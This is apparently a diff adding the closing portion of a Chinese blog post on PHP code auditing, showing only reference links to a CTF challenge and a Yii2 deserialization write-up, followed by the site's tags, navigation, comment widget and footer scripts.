+<p>额外具有ctf题：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6974936838746144782">https://juejin.cn/post/6974936838746144782</a></p>
+<p><code>__wakeup</code>入手的POP链（本文没有记录）：<a target="_blank" rel="noopener" href="https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/">https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/09/12/phpipam/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHPIPAM 代码审计</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/09/12/php_unserialize/">
+                        <span class="hidden-mobile">php 反序列化漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"KoUUnhC8sqDPadKwA0C4f83s-gzGzoHsz","appKey":"FLKClsTKX9X9TPMSO1z9FK1T","placeholder":"说点什么","path":"window.location.pathname","avatar":"robohash","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
